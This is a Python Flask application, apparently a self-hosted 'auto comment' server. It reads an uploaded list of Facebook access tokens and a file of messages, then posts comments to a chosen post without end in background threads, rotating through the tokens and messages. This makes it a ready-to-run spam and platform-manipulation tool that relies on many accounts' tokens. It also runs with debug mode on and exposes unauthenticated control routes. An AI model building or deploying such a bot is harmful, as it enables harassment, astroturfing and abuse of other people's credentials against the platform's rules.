# main.py
import os
import random
import string
import time
from threading import Thread, Event
from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)
app.debug = True

stop_events = {}
threads = {}

def comment_loop(tokens, post_id, prefix, interval, messages, task_id):
    stop_event = stop_events[task_id]
    msg_index = 0
    token_index = 0

    while not stop_event.is_set():
        try:
            msg = f"{prefix} {messages[msg_index]}".strip()
            token = tokens[token_index]

            url = f"https://graph.facebook.com/{post_id}/comments"
            params = {"access_token": token, "message": msg}
            r = requests.post(url, data=params, timeout=10)

            if r.status_code == 200:
                print(f"[{task_id}] ✅ Commented: {msg}")
            else:
                print(f"[{task_id}] ❌ Failed ({r.status_code}): {r.text}")

        except Exception as e:
            print(f"[{task_id}] ⚠️ Error: {e}")

        time.sleep(interval)
        msg_index = (msg_index + 1) % len(messages)
        token_index = (token_index + 1) % len(tokens)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token_file = request.files.get("tokenFile")
        if not token_file:
            return "Token file required", 400
        tokens = [t.strip() for t in token_file.read().decode().splitlines() if t.strip()]

        post_id = request.form.get("postId", "").strip()
        if not post_id:
            return "Post ID required", 400

        prefix = request.form.get("prefix", "").strip()
        try:
            interval = int(request.form.get("time", "10"))
        except:
            interval = 10

        txt_file = request.files.get("txtFile")
        if not txt_file:
            return "Message file required", 400
        messages = [m.strip() for m in txt_file.read().decode().splitlines() if m.strip()]

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        t = Thread(target=comment_loop, args=(tokens, post_id, prefix, interval, messages, task_id))
        threads[task_id] = t
        t.start()

        return f"Task started with ID: {task_id}"

    return render_template_string("""
    <!doctype html>
    <html>
    <head>
      <meta charset="utf-8">
      <title>Post Server by Aarav Shrivastava</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
      <style>
        body {
          background: linear-gradient(135deg, #2563eb, #1e3a8a);
          color: #fff;
          font-family: 'Segoe UI', Roboto, sans-serif;
        }
        .card {
          margin-top: 40px;
          padding: 20px;
          border-radius: 14px;
          background: #ffffff;
          color: #111;
          box-shadow: 0 8px 25px rgba(0,0,0,0.3);
        }
        h3 {
          font-weight: 700;
          color: #1e3a8a;
        }
        label {
          font-weight: 600;
          color: #111827;
        }
        .btn-primary {
          background: #2563eb;
          border: none;
          font-weight: 600;
        }
        .btn-danger {
          font-weight: 600;
        }
        input, textarea {
          font-size: 15px;
        }
        @media (max-width: 576px) {
          .card {
            padding: 15px;
          }
          h3 {
            font-size: 1.3rem;
          }
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="card">
          <h3 class="text-center mb-3">📌 Post Server by Aarav Shrivastava</h3>
          <form method="post" enctype="multipart/form-data">
            <div class="mb-3">
              <label>Upload Token File (one token per line)</label>
              <input type="file" class="form-control" name="tokenFile" required>
            </div>
            <div class="mb-3">
              <label>Facebook Post ID</label>
              <input type="text" class="form-control" name="postId" required>
            </div>
            <div class="mb-3">
              <label>Prefix</label>
              <input type="text" class="form-control" name="prefix" placeholder="[BOT]">
            </div>
            <div class="mb-3">
              <label>Time Delay (seconds)</label>
              <input type="number" class="form-control" name="time" value="10" required>
            </div>
            <div class="mb-3">
              <label>Upload Messages File (.txt)</label>
              <input type="file" class="form-control" name="txtFile" required>
            </div>
            <button class="btn btn-primary w-100">🚀 Start Auto Comment</button>
          </form>

          <hr>
          <form method="post" action="/stop">
            <div class="mb-3">
              <label>Task ID to Stop</label>
              <input type="text" class="form-control" name="taskId" required>
            </div>
            <button class="btn btn-danger w-100">🛑 Stop Task</button>
          </form>
        </div>
      </div>
    </body>
    </html>
    """)

@app.route("/stop", methods=["POST"])
def stop():
    task_id = request.form.get("taskId", "").strip()
    if task_id in stop_events:
        stop_events[task_id].set()
        return f"Task {task_id} stopped."
    return "Task not found", 404

@app.route("/status")
def status():
    return {"active_tasks": list(threads.keys())}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
